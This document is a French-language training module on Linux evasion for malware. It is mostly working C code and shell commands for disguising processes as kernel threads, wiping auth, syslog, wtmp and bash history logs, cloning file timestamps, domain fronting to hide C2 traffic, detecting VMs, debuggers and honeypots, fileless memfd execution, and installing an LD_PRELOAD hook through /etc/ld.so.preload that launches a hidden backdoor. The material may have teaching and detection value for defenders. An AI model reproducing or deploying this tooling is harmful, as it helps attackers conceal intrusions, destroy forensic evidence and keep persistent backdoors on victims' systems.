# Module L27 : Evasion Linux - Techniques Furtives

## Objectifs

A la fin de ce module, tu vas maîtriser :
- Les techniques de masquage de processus
- L'anti-forensics et nettoyage de traces
- L'évasion de détection système
- Les techniques de camouflage réseau
- Le spoofing de métadonnées

## 1. Masquage de Processus

### 1.1 Process Name Spoofing

```ascii
┌──────────────────────────────────────────────────┐
│  PROCESS HIDING TECHNIQUES                       │
├──────────────────────────────────────────────────┤
│                                                  │
│  ps aux affiche:                                 │
│  USER   PID  %CPU %MEM COMMAND                   │
│  root   1234  0.0  0.1 [kworker/0:1]  ← Fake!   │
│                                                  │
│  En réalité: notre malware                       │
│                                                  │
└──────────────────────────────────────────────────┘
```

```c
// proc_spoof.c
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>

void spoof_process_name(int argc, char *argv[], const char *fake_name) {
    // Méthode 1: Modifier argv[0] (ps affiche ça)
    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], fake_name, strlen(argv[0]));

    // Méthode 2: prctl (change /proc/self/comm)
    prctl(PR_SET_NAME, fake_name, 0, 0, 0);
}

int main(int argc, char *argv[]) {
    // Utiliser nom de processus système légitime
    spoof_process_name(argc, argv, "[kworker/0:1]");

    // Le malware tourne ici...
    while (1) {
        // Code malveillant
        sleep(10);
    }

    return 0;
}
```

### 1.2 Parent Process ID Spoofing

```c
// ppid_spoof.c - Faire croire que notre processus vient d'init/systemd
#include <unistd.h>
#include <sys/types.h>

void become_orphan() {
    pid_t pid = fork();

    if (pid > 0) {
        // Parent exit immédiatement
        exit(0);
    }

    // Child devient orphelin, adopté par PID 1 (init/systemd)
    setsid();  // Nouvelle session

    // Maintenant getppid() == 1
}
```

## 2. Anti-Forensics

### 2.1 Nettoyage des Logs

```c
// log_wiper.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Effacer lignes dans fichier log
void wipe_log_entries(const char *logfile, const char *pattern) {
    char cmd[512];

    // Utiliser sed pour supprimer lignes contenant pattern
    snprintf(cmd, sizeof(cmd),
             "sed -i '/%s/d' %s 2>/dev/null",
             pattern, logfile);

    system(cmd);
}

// Nettoyer tous les logs communs
void clean_all_logs() {
    const char *logs[] = {
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/kern.log",
        "/var/log/messages",
        "~/.bash_history",
        NULL
    };

    for (int i = 0; logs[i] != NULL; i++) {
        // Tronquer fichier (ne pas supprimer, suspect!)
        truncate(logs[i], 0);
    }

    // Nettoyer historique bash de l'utilisateur courant
    unlink(getenv("HISTFILE"));
    putenv("HISTFILE=/dev/null");
}

// Nettoyer traces spécifiques
void clean_traces() {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    // Supprimer lignes contenant notre hostname
    wipe_log_entries("/var/log/auth.log", hostname);

    // Supprimer lignes SSH
    wipe_log_entries("/var/log/auth.log", "sshd");

    // Nettoyer lastlog
    system("echo > /var/log/wtmp");
    system("echo > /var/log/btmp");
}
```

### 2.2 Timestamp Manipulation

```c
// timestamp_spoof.c
#include <sys/stat.h>
#include <sys/time.h>
#include <utime.h>

// Copier timestamps d'un fichier légitime vers notre malware
void clone_timestamps(const char *source, const char *target) {
    struct stat st;
    struct utimbuf new_times;

    // Lire timestamps du fichier source
    stat(source, &st);

    // Appliquer au target
    new_times.actime = st.st_atime;
    new_times.modtime = st.st_mtime;
    utime(target, &new_times);
}

int main() {
    // Copier timestamps de /bin/ls vers notre malware
    clone_timestamps("/bin/ls", "/tmp/malware");

    return 0;
}
```

## 3. Evasion Réseau

### 3.1 Jitter et Randomization

```c
// network_jitter.c
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

// Sleep aléatoire pour éviter pattern de communication
void random_sleep(int min_sec, int max_sec) {
    srand(time(NULL) ^ getpid());
    int sleep_time = min_sec + (rand() % (max_sec - min_sec));
    sleep(sleep_time);
}

// Varier User-Agent
const char *random_user_agent() {
    const char *uas[] = {
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/121.0",
        "curl/7.68.0",
        "python-requests/2.31.0",
        NULL
    };

    srand(time(NULL));
    int idx = rand() % 4;
    return uas[idx];
}
```

### 3.2 Domain Fronting et Redirection

```c
// domain_fronting.c
#include <curl/curl.h>

int fronted_request(const char *front_domain, const char *real_target) {
    CURL *curl = curl_easy_init();

    // URL pointe vers CDN
    char url[256];
    snprintf(url, sizeof(url), "https://%s/path", front_domain);
    curl_easy_setopt(curl, CURLOPT_URL, url);

    // Host header pointe vers vrai C2
    struct curl_slist *headers = NULL;
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", real_target);
    headers = curl_slist_append(headers, host_header);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    CURLcode res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? 0 : -1;
}
```

## 4. Détection d'Environnement

### 4.1 VM/Sandbox Detection

```c
// vm_detect.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int is_vm() {
    FILE *fp;
    char buffer[256];
    int vm_detected = 0;

    // Check DMI info
    fp = fopen("/sys/class/dmi/id/product_name", "r");
    if (fp) {
        fgets(buffer, sizeof(buffer), fp);
        if (strstr(buffer, "VMware") ||
            strstr(buffer, "VirtualBox") ||
            strstr(buffer, "QEMU")) {
            vm_detected = 1;
        }
        fclose(fp);
    }

    // Check CPU info
    fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        while (fgets(buffer, sizeof(buffer), fp)) {
            if (strstr(buffer, "hypervisor")) {
                vm_detected = 1;
                break;
            }
        }
        fclose(fp);
    }

    return vm_detected;
}

int is_debugged() {
    // Check si tracé par strace/gdb
    FILE *fp = fopen("/proc/self/status", "r");
    char line[256];

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int tracer_pid;
            sscanf(line + 10, "%d", &tracer_pid);
            fclose(fp);
            return (tracer_pid != 0);
        }
    }

    fclose(fp);
    return 0;
}

int main() {
    if (is_vm()) {
        printf("VM detected, exiting...\n");
        exit(0);
    }

    if (is_debugged()) {
        printf("Debugger detected, exiting...\n");
        exit(0);
    }

    // Code malveillant ici
    return 0;
}
```

### 4.2 Honeypot Detection

```c
// honeypot_detect.c
#include <netdb.h>
#include <time.h>

int check_dns_sinkhole() {
    // Résoudre domaine random unique
    char canary[128];
    time_t t = time(NULL);
    snprintf(canary, sizeof(canary), "nonexistent-%ld.example.com", t);

    struct hostent *he = gethostbyname(canary);

    // Si résout, probablement DNS sinkhole/honeypot
    return (he != NULL);
}

int check_file_access() {
    // Créer fichier honeypot
    FILE *fp = fopen("/tmp/.honeypot_test", "w");
    if (!fp) return 0;
    fprintf(fp, "test");
    fclose(fp);

    // Attendre
    sleep(1);

    // Vérifier si modifié (signe de monitoring)
    struct stat st1, st2;
    stat("/tmp/.honeypot_test", &st1);
    sleep(2);
    stat("/tmp/.honeypot_test", &st2);

    unlink("/tmp/.honeypot_test");

    // Si atime changé sans notre action = monitoring
    return (st1.st_atime != st2.st_atime);
}
```

## 5. Memory Residence

### 5.1 Fileless Execution

```c
// memfd_exec.c - Exécuter code en mémoire sans fichier sur disque
#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <string.h>

int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

void execute_in_memory(const unsigned char *payload, size_t payload_size) {
    // Créer fd en mémoire
    int fd = memfd_create("", MFD_CLOEXEC);

    // Écrire payload
    write(fd, payload, payload_size);

    // Construire path /proc/self/fd/X
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

    // Exec depuis mémoire
    char *args[] = {path, NULL};
    execv(path, args);
}
```

### 5.2 Process Hollowing

```c
// proc_hollow.c - Injecter code dans processus légitime
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>

int hollow_process(const char *target_binary, void *shellcode, size_t sc_size) {
    pid_t pid = fork();

    if (pid == 0) {
        // Child: Permettre ptrace par parent
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execl(target_binary, target_binary, NULL);
    }

    // Parent: Attendre child
    int status;
    waitpid(pid, &status, 0);

    // Trouver entry point
    // TODO: Parser /proc/pid/maps, trouver executable region

    // Injecter shellcode
    // TODO: ptrace(PTRACE_POKEDATA) pour écrire shellcode

    // Continuer execution
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    return 0;
}
```

## 6. Persistence Furtive

### 6.1 LD_PRELOAD Hook Persistant

```c
// Créer bibliothèque partagée qui hook fonction système
// preload_hook.so
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>

ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*real_write)(int, const void *, size_t) = NULL;

    if (!real_write) {
        real_write = dlsym(RTLD_NEXT, "write");
    }

    // Intercepter tous les write() système
    // Lancer backdoor si pas déjà fait
    static int backdoor_launched = 0;
    if (!backdoor_launched) {
        backdoor_launched = 1;
        if (fork() == 0) {
            // Lancer backdoor en background
            system("/tmp/.hidden_backdoor &");
            exit(0);
        }
    }

    return real_write(fd, buf, count);
}
```

Installation:
```bash
gcc -shared -fPIC -o /lib/x86_64-linux-gnu/libpreload.so preload_hook.c -ldl
echo "/lib/x86_64-linux-gnu/libpreload.so" >> /etc/ld.so.preload
```

## Checklist

- [ ] Je sais masquer le nom d'un processus
- [ ] Je comprends le spoofing de PPID
- [ ] Je peux nettoyer les logs système
- [ ] Je maîtrise la manipulation de timestamps
- [ ] Je connais les techniques de jitter réseau
- [ ] Je sais détecter les VMs et debuggers
- [ ] Je comprends l'exécution fileless (memfd)
- [ ] Je peux implémenter LD_PRELOAD hooks

## Exercices

Voir [exercice.md](exercice.md)
